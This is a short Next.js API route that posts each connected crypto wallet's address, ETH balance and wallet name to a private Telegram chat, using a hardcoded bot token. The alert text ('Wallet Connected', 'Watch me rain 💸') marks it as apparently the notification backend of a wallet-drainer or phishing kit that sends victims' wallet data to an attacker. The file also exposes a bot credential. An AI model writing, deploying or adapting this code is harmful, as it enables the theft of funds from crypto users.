import { NextResponse } from 'next/server';
import TelegramBot from "node-telegram-bot-api"

export async function POST(request: Request) {
    const body = await request.json();

    const bot = new TelegramBot('7825258454:AAHSAxS7tIK5NgSOV3kIROjdfi5ScUc4ZI8', { polling: false })
    const chatId = '-4699958230';
    
    bot.sendMessage(chatId, `🚨 Wallet Connected 🚨\n\nWallet Address : ${body.address} 💳\nBalance : ${body.balance} ETH 💰\nWallet Agent: ${body.name} 💻\n\nSweet, Watch me rain 💸`);
    return NextResponse.json({msg: 'ok'})
}
